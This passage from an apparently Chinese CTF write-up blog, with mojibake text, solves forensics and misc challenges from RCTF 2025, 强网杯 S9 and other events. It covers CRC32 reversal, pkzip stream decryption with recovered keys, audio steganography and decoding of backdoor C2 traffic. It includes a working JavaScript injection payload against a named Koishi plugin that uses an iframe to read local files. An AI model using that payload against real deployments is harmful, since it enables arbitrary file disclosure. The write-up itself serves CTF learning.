class="number">0x7aae1d0a</span>, <span class="number">0x616c6729</span>, <span class="number">0x2b51c9d4</span>, <span class="number">0xb6e26299</span>, <span class="number">0xdff453c4</span>, <span class="number">0x9331116d</span>, <span class="number">0x324af895</span>, <span class="number">0x7c9a17</span>, <span class="number">0x7e2361b8</span>, <span class="number">0x7c65dfe1</span>, <span class="number">0x9e4be534</span>, <span class="number">0x324af895</span>, <span class="number">0x821fc2f0</span>, <span class="number">0x78e8a353</span>, <span class="number">0xac828282</span>, <span class="number">0x9e4be534</span>, <span class="number">0x6504596</span>, <span class="number">0xcaa8f9df</span>, <span class="number">0x64dc7498</span>, <span class="number">0x779f2fbd</span>, <span class="number">0x7b27b1d3</span>, <span class="number">0xcb9596dc</span>, <span class="number">0xaab6455d</span>, <span class="number">0xb72008ae</span>, <span class="number">0xb3ad741c</span>, <span class="number">0xa10773ef</span>, <span class="number">0x2b9de25f</span>, <span class="number">0x9b04f3b1</span>, <span class="number">0x48f88f87</span>, <span class="number">0xac828282</span>, <span class="number">0x821fc2f0</span>, <span class="number">0x6a2254af</span>, <span class="number">0xcaa8f9df</span>, <span class="number">0x3e3e4d70</span>, <span class="number">0x7b91940</span>, <span class="number">0x3c78f329</span>, <span class="number">0xe435b9ad</span>, <span class="number">0x6847643</span>, <span class="number">0x2c944a83</span>, <span class="number">0xc4a9dcdc</span>, <span class="number">0x9c0d5b6d</span>, <span class="number">0xa341cdb6</span>, <span class="number">0x358f7bc2</span>, <span class="number">0x13f3eab9</span>, <span class="number">0x6193621d</span>, <span class="number">0x159ed4a</span>, <span class="number">0x69a680c1</span>, <span class="number">0x4fb4a8</span>, <span class="number">0x70968761</span>, <span class="number">0x2f60fc5</span>, <span class="number">0x3937e5ac</span>, <span class="number">0x9b04f3b1</span>, <span class="number">0x1d26fc6f</span>, <span class="number">0x95fad386</span>, <span class="number">0x3937e5ac</span>, <span class="number">0x37c9c59b</span>, <span class="number">0xa341cdb6</span>, <span class="number">0xeb09f3ad</span>, <span class="number">0xa448656a</span>, <span class="number">0xab742f6a</span>, <span class="number">0x2090af1</span>, <span class="number">0xe435b9ad</span>, <span class="number">0xb26f1e2b</span>, <span class="number">0xecd468a4</span>, <span class="number">0x26cc20e7</span>, <span class="number">0x1ea22801</span>, <span class="number">0x64dc7498</span>, <span class="number">0x638602f4</span>, <span class="number">0x26b4c8b6</span>, <span class="number">0x61d8a4f3</span>, <span class="number">0xb15f099f</span>, <span class="number">0x88a078ba</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(len(crc_list))</span></span><br><span class="line">    res = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> crc_values:</span><br><span class="line">        res += crc32_reverse(item, <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;res.bin&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(res)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ³¨æ„æœ€åä¸€ä¸ªå‹ç¼©åŒ…ä¸­çš„ txt æ˜¯ 3 å­—èŠ‚ï¼Œéœ€è¦å•ç‹¬å¤„ç†ä¸€ä¸‹</p><p>æœ€åå¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">53 29 00 00 CB AE 02 00 CB 2C 00 00 53 31 04 00</span><br><span class="line">D3 32 04 00 D3 32 02 00 D3 32 00 00 D3 32 06 00</span><br><span class="line">33 D5 02 00 33 B2 04 00 D3 32 01 00 33 34 06 00</span><br><span class="line">33 4D 04 00 33 4F 03 00 D3 32 00 00 D3 32 02 00</span><br><span class="line">33 D3 02 00 33 D0 02 00 33 36 05 00 D3 32 00 00</span><br><span class="line">33 31 04 00 33 D6 02 00 4B B6 00 00 33 36 05 00</span><br><span class="line">B3 48 06 00 4B B5 04 00 4B 35 03 00 B3 30 05 00</span><br><span class="line">B3 48 03 00 33 34 03 00 33 33 07 00 33 35 06 00</span><br><span class="line">33 33 06 00 33 4F 01 00 4B 35 04 00 33 31 05 00</span><br><span class="line">4B 31 00 00 4B B6 00 00 33 31 04 00 4B 4E 05 00</span><br><span class="line">4B B5 04 00 4B 4D 03 00 4B 31 07 00 4B 4E 03 00</span><br><span class="line">33 32 00 00 33 B0 00 00 4B 31 04 00 33 4E 05 00</span><br><span class="line">33 35 05 00 33 4C 01 00 4B 31 05 00 B3 30 01 00</span><br><span class="line">4B 32 03 00 B3 4C 06 00 4B 4C 05 00 33 B5 00 00</span><br><span class="line">B3 34 05 00 4B 36 07 00 4B 49 03 00 33 31 05 00</span><br><span class="line">4B 33 06 00 33 4A 03 00 4B 49 03 00 4B 32 05 00</span><br><span class="line">33 4C 01 00 33 48 06 00 33 48 01 00 33 32 07 00</span><br><span class="line">33 B6 00 00 33 32 00 00 33 32 06 00 B3 B4 00 00</span><br><span class="line">B3 34 03 00 4B 31 06 00 4B 35 03 00 D3 52 01 00</span><br><span class="line">D3 2F 00 00 CB AE 02 00 CB 2C 00 00 53 01 00</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ•°æ®æŒ‰æ¯4å­—èŠ‚ä¸€ç»„è§£å‹ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªzipçš„hash:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">hex_data = <span class="string">&quot;53290000CBAE0200CB2C000053310400D3320400D3320200D3320000D332060033D5020033B20400D332010033340600334D0400334F0300D3320000D332020033D3020033D0020033360500D33200003331040033D602004BB6000033360500B34806004BB504004B350300B3300500B348030033340300333307003335060033330600334F01004B350400333105004B3100004BB60000333104004B4E05004BB504004B4D03004B3107004B4E03003332000033B000004B310400334E050033350500334C01004B310500B33001004B320300B34C06004B4C050033B50000B33405004B3607004B490300333105004B330600334A03004B4903004B320500334C010033480600334801003332070033B600003332000033320600B3B40000B33403004B3106004B350300D3520100D32F0000CBAE0200CB2C0000530100&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">bytes</span>.fromhex(hex_data)</span><br><span class="line"></span><br><span class="line">chunks = [data[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">out = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> chunks:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        out += zlib.decompress(c, -zlib.MAX_WBITS)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad chunk:&quot;</span>, c.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out.decode())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pkzip$1*1*2*0*35*29*4135a7f*0*26*0*35*0413*c8358ce9e6858f166753637de145d0c841cee9efd7cf2008d13e551dd584b69cae5895c7df45f32fdfb51d0c0d273820239896d3e6*$/pkzip$</span><br></pre></td></tr></table></figure><p>å‚è€ƒ2025 buckeyeCTF-zip2john2zip wp:</p><p><a href="https://github.com/cscosu/buckeyectf-2025-public/blob/master/forensics/zip2john2zip/solve/solve.py">https://github.com/cscosu/buckeyectf-2025-public/blob/master/forensics/zip2john2zip/solve/solve.py</a></p><p>å·²çŸ¥ä¸‰ä¸ªå†…éƒ¨å¯†é’¥å’Œå“ˆå¸Œå€¼ï¼Œè¿˜åŸzipå¹¶è§£å‹ç¼©ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pkcrc</span>(<span class="params">x, b</span>):</span><br><span class="line">    x = (x ^ b) &amp; <span class="number">0xFFFFFFFF</span> </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> x &amp; <span class="number">1</span>:</span><br><span class="line">            x = (x &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xedb88320</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_stream_with_keys</span>(<span class="params">enc, key0, key1, key2</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_update_keys</span>(<span class="params">byte_val</span>):</span><br><span class="line">        <span class="keyword">nonlocal</span> key0, key1, key2</span><br><span class="line">        key0 = pkcrc(key0, byte_val)</span><br><span class="line">        temp = (key1 + (key0 &amp; <span class="number">0xff</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        key1 = (((temp * <span class="number">0x08088405</span>) &amp; <span class="number">0xFFFFFFFF</span>) + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        key2 = pkcrc(key2, (key1 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_keystream_byte</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> key2</span><br><span class="line">        temp = (key2 &amp; <span class="number">0xFFFF</span>) | <span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> (((temp * (temp ^ <span class="number">1</span>)) &amp; <span class="number">0xFFFF</span>) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">    out = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> enc:</span><br><span class="line">        ks = _get_keystream_byte()</span><br><span class="line">        d = e ^ ks</span><br><span class="line">        out.append(d)</span><br><span class="line">        _update_keys(d)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># your recovered keys:</span></span><br><span class="line">    k0 = <span class="number">0xb47e923c</span></span><br><span class="line">    k1 = <span class="number">0x5aeb49a7</span></span><br><span class="line">    k2 = <span class="number">0xa3cd7af0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># encrypted data from $pkzip$ hash</span></span><br><span class="line">    hash_text = <span class="string">&quot;$pkzip$1*1*2*0*35*29*4135a7f*0*26*0*35*0413*c8358ce9e6858f166753637de145d0c841cee9efd7cf2008d13e551dd584b69cae5895c7df45f32fdfb51d0c0d273820239896d3e6*$/pkzip$&quot;</span></span><br><span class="line">    enc_hex = hash_text.split(<span class="string">&#x27;*&#x27;</span>)[<span class="number">12</span>]  <span class="comment"># not 13 !</span></span><br><span class="line">    enc = <span class="built_in">bytes</span>.fromhex(enc_hex)</span><br><span class="line"></span><br><span class="line">    plain = decrypt_stream_with_keys(enc, k0, k1, k2)</span><br><span class="line">    <span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š</p><p><code>b&#39;\xcf\xecP\x1f\x89\x9e\x83q1&quot;\xa4\x04flag&#123;W0ww_th3_C@ske7|s_Tre4sur3_unl0cke9&#125;&#39;</code></p><h3 id="çŒ«å’ªç”µå°"><a href="#çŒ«å’ªç”µå°" class="headerlink" title="çŒ«å’ªç”µå°"></a>çŒ«å’ªç”µå°</h3><p>ç»™äº†pngå’Œwavä¸¤ä¸ªé™„ä»¶</p><p>pngå­˜åœ¨LSBéšå†™ï¼ŒæŒ‰ç…§BRGé€šé“é¡ºåºæå–å¾—åˆ°flag0å›¾ç‰‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag part0ï¼š ==gNWRWTFRjY4IGV4sGczg0QzAFUyQTQ</span><br></pre></td></tr></table></figure><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021636043.png" alt="image-20251202163630987"></p><p><code>flag0: Ci4l10~</code></p><p>åœ¨1.wavæ–‡ä»¶å°¾åå‘ç°å‹ç¼©åŒ…ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021638249.png" alt="image-20251202163831186"></p><p>è§£å‹éœ€è¦å¯†ç </p><p>åˆ é™¤æ–‡ä»¶å°¾éƒ¨çš„zipåï¼ŒæŸ¥çœ‹wavä¿¡æ¯ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021640383.png" alt="image-20251202164023354"></p><p>ç”¨Audacityå¯¼å…¥åŸå§‹æ•°æ®ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512022254375.png" alt="image-20251202164244753"></p><p>å…¶é¢‘è°±å›¾æ˜¯ä¸¤æ¡æ¸…æ™°çš„é¢‘ç‡ï¼Œåˆ¤æ–­ä¸ºRTTY</p><blockquote><p>RTTYä½¿ç”¨ä¸¤ç§é¢‘ç‡æ¥ä»£è¡¨ä¸¤ç§ä¸åŒçš„ä¿¡å·çŠ¶æ€ï¼šMark å’Œ Spaceã€‚</p><p>Marké¢‘ç‡ï¼ˆé€šå¸¸ä¸ºè¾ƒä½é¢‘ç‡ï¼‰å¯¹åº”â€œ1â€ã€‚</p><p>Spaceé¢‘ç‡ï¼ˆé€šå¸¸ä¸ºè¾ƒé«˜é¢‘ç‡ï¼‰å¯¹åº”â€œ0â€ã€‚</p><p>åœ¨ä¼ è¾“æ—¶ï¼Œä¿¡å·ä¼šåœ¨è¿™ä¸¤ç§é¢‘ç‡ä¹‹é—´åˆ‡æ¢ï¼Œå½¢æˆä¸€ä¸ªç±»ä¼¼äºâ€œ0â€å’Œâ€œ1â€çš„äºŒè¿›åˆ¶æ¨¡å¼ã€‚</p></blockquote><p>è§£ç å¾—åˆ°passwordå’Œflag1ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512021645055.png" alt="image-20251202164506021"></p><p>ä½¿ç”¨å¯†ç è§£å‹2.wav:</p><p>é‡‡æ ·ç‡éå¸¸é«˜ï¼ŒçŒœæµ‹æ˜¯ SDR(è½¯ä»¶å®šä¹‰æ— çº¿ç”µ) æ•è·çš„æ— çº¿ä¿¡å·æ•°æ®,å› æ­¤ä½¿ç”¨ SDR# (SDRSharp) è¿›è¡Œè§£æ</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512022246885.png" alt="image-20251202224618694"></p><p>å¾—åˆ°flagpart2</p><p>_CAT9LIVES</p><p>å› æ­¤flagï¼š</p><p>flag{Ci4l10~R77YM30W1SFUN_CAT9LIVES}</p><h2 id="RCTF-2025"><a href="#RCTF-2025" class="headerlink" title="RCTF 2025"></a>RCTF 2025</h2><p>æœ¬æ¬¡é˜Ÿä¼æ’åï¼š23</p><blockquote><p>å¤ç°å‚è€ƒï¼š<a href="https://su-team.cn/posts/63a9ee12.html">https://su-team.cn/posts/63a9ee12.html</a></p></blockquote><h3 id="Asgard-Fallen-Down"><a href="#Asgard-Fallen-Down" class="headerlink" title="Asgard Fallen Down"></a>Asgard Fallen Down</h3><p>å…ˆæ‰¾åˆ°å»ºç«‹è¿æ¥çš„æµé‡ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211251242.png" alt="image-20251121125112113"></p><p>è§£ç è¿™é‡Œçš„æ•°æ®ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211253632.png" alt="image-20251121125344561"></p><p>å‘ç°äº†ç¬¬ä¸€é“é¢˜ä¸­ï¼Œåé—¨å¯„ç”Ÿçš„è¿›ç¨‹</p><p>åŒæ—¶ä¸‹é¢å“åº”æœ‰å‡ ä¸ªbase64å­—ç¬¦ä¸²ï¼ˆbuild,versionï¼‰</p><p>æ ¹æ®é•¿åº¦åˆ¤æ–­ï¼Œæ˜¯AESçš„keyå’Œiv</p><p>build: 20251115-VdmEJO6SDkVWYkSQD4dPfLnvkmqRUCvrELipO14dfVs= </p><p> version: 1.2.3-EjureNfe2IA6jFEZEih84w==</p><p>ç´§æ¥ç€ä¸‹é¢æˆ‘ä»¬èƒ½å‘ç°ä¸€æ¡åŠ å¯†çš„æ•°æ®ï¼Œä½¿ç”¨keyå’Œivè¿›è¡Œè§£å¯†ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211257851.png" alt="image-20251121125755788"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211300960.png" alt="image-20251121130038893"></p><p>å¾—åˆ°æ‰§è¡Œçš„å‘½ä»¤ï¼š <code>spawn whoami</code></p><p>åœ¨ä¹‹åçš„è¯·æ±‚é‡Œå¾—åˆ°å‘½ä»¤æ‰§è¡Œç»“æœï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211303695.png" alt="image-20251121130341639"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211303451.png" alt="image-20251121130324374"></p><p>å¯ä»¥å‘ç°æ•´ä¸ªæµé‡çš„æ¨¡å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬Næ¬¡è¯·æ±‚ â†’ å“åº”HTMLä¸­çš„buildæ³¨é‡ŠåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ ä¸¤æ¬¡base64</span><br><span class="line"></span><br><span class="line">ç¬¬N+1æ¬¡è¯·æ±‚ â†’ é€šè¿‡ç‰¹æ®Šheaderå›ä¼ å‘½ä»¤æ‰§è¡Œç»“æœ ä¸€æ¬¡base64</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ•´ä¸ªæµé‡å°±æ¸…æ™°è®¸å¤šäº†</p><p>æ•´ä¸ªæµä¸¢ç»™aiåˆ†æï¼Œå¯ä»¥å¾—åˆ°å¿ƒè·³é—´éš”10s:</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211313498.png" alt="image-20251121131322448"></p><p>Challenge 3: The Heart of Iron:<br>ç»§ç»­è§£ç åˆ†æå³å¯ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211320201.png" alt="image-20251121132028131"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211320459.png" alt="image-20251121132016390"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211321149.png" alt="image-20251121132107081"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211322901.png" alt="image-20251121132222820"></p><p>Challenge 4: Odinâ€™s Eye</p><p>æœç´¢å…³é”®è¯<code>build:20251115</code>å¯åœ¨2787æµä¸­æ‰¾åˆ°æœ¬é¢˜çš„æ‰§è¡Œå‘½ä»¤</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211324230.png" alt="image-20251121132455168"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211325331.png" alt="image-20251121132520263"></p><p>ä¹‹åæœ‰å¾ˆå¤šå¤§å—çš„å“åº”åŒ…ï¼Œæ˜¯å›¾ç‰‡çš„åˆ†æ®µä¼ è¾“ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211330929.png" alt="image-20251121133059835"></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211332154.png" alt="image-20251121133201076"></p><p>å¾—åˆ°å›¾ç‰‡ï¼Œå·¥å…·æ˜¯æ— å½±ï¼š<code>TscanPlus</code></p><h3 id="Wanna-Feel-Love"><a href="#Wanna-Feel-Love" class="headerlink" title="Wanna Feel Love"></a>Wanna Feel Love</h3><p>ç¬¬ä¸€é—®ï¼Œä¸ºåƒåœ¾é‚®ä»¶éšå†™</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211335840.png" alt="image-20251121133549794"></p><p>ä½¿ç”¨ï¼š<a href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a></p><p>å·¥å…·è¿›è¡Œè§£å¯†å³å¯ã€‚</p><p>ç¬¬äºŒé—®ï¼Œä½¿ç”¨OpenMPTæ‰“å¼€åï¼Œå¯ä»¥çœ‹æ‡‚5ï¼šfeel</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202511211336651.png" alt="image-20251121133615599"></p><p>é»‘ä¸º0çº¢ä¸º1</p><p>è§£ç åå¾—åˆ°<code>I Feel Fantastic heyheyhey</code></p><p>å› ä¸ºçº¢é»‘è‰²å®½åº¦ä¸ä¸€ï¼Œæ‰€ä»¥å½“æ—¶æ²¡å¾€è¿™é‡Œæƒ³â€¦â€¦&lt;(ï¼¿ã€€ï¼¿)&gt;</p><h3 id="514"><a href="#514" class="headerlink" title="514"></a>514</h3><p>æ‰¾åˆ°æ’ä»¶ï¼š</p><p><a href="https://github.com/araea/koishi-plugin-pjsk-pptr">https://github.com/araea/koishi-plugin-pjsk-pptr</a></p><p>å…¶ä¸­pjskåœ¨æˆªå›¾æ—¶è°ƒç”¨äº†puppeteerè¿›è¡Œæ¸²æŸ“ï¼Œè®¾å®šçš„textæœªç»è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ koishi-plugin-pjsk-pptr/src/index.ts:L1084-L1088</span><br><span class="line">const canvas = document.getElementById(&quot;myCanvas&quot;);</span><br><span class="line">const context = canvas.getContext(&#x27;2d&#x27;);</span><br><span class="line">const text = &#x27;$&#123;text&#125;&#x27;;</span><br><span class="line">const x = $&#123;specifiedX&#125;;</span><br><span class="line">const y = $&#123;specifiedY&#125;;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„ç›´æ¥æŠŠç”¨æˆ·è¾“å…¥æ‹¼è¿› htmlï¼Œä¸” urlä¸º file: åè®®ï¼Œå¯ä»¥æ„é€  iframe å®ç°æœ¬åœ°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>payload:</p><p><code>pjsk ç»˜åˆ¶ &#39;;const b=String.fromCharCode(47);const a=document.createElement(&#39;iframe&#39;);a.setAttribute(&#39;src&#39;,&#39;file:&#39;+b+b+b+&#39;flag&#39;);a.setAttribute(&#39;style&#39;,&#39;position: fixed;top: 0;left: 0;background: white;&#39;);document.body.appendChild(a);&#39;</code></p><h2 id="å¼ºç½‘æ¯S9"><a href="#å¼ºç½‘æ¯S9" class="headerlink" title="å¼ºç½‘æ¯S9"></a>å¼ºç½‘æ¯S9</h2><blockquote><p>å¤ç°å‚è€ƒï¼š<a href="https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/#title-19">https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/#title-19</a></p></blockquote><h3 id="è°å½±é‡é‡-6-0"><a href="#è°å½±é‡é‡-6-0" class="headerlink" title="è°å½±é‡é‡ 6.0"></a>è°å½±é‡é‡ 6.0</h3><p>é™„ä»¶ä¸€ä¸ªæµé‡åŒ…å’Œä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…,å¾ˆæ˜¾ç„¶éœ€è¦æˆ‘ä»¬åˆ†ææµé‡æ‰¾åˆ°å¯†ç </p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510281307569.png" alt="image-20251028130726483"></p><p>æµé‡åŒ…ä¼ è¾“çš„æ˜¯éŸ³é¢‘(æ ¹æ®é¢˜ç›®æç¤ºä»¥åŠæµé‡åŒ…åˆ†æ),å› æ­¤éœ€è¦æƒ³åŠæ³•æå–å‡ºéŸ³é¢‘æ¥.</p><p>åœ¨ç”µè¯-RTPæµä¸­å¯ä»¥çœ‹åˆ°ä¼ è¾“çš„æ•°æ®ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510311917237.png" alt="image-20251031191432813"></p><p> play streams    â†’   export â€“ from cursorå°±å¯ä»¥å¯¼å‡ºæ•°æ®</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202510311919006.png" alt="image-20251031191936908"></p><p>ä½†æ˜¯å¯¼å‡ºå‘ç°å£°éŸ³å¾ˆå°ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¹Ÿä¸èƒ½è¿™æ ·ä¸€ä¸ªä¸ªå¯¼å‡ºï¼Œå¤ªåƒæ“ä½œäº†ã€‚</p><p>å› æ­¤éœ€è¦ä¸€ä¸ªè„šæœ¬æ¥è¾…åŠ©æˆ‘ä»¬ã€‚</p><p>è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹Polarisæˆ˜é˜Ÿçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 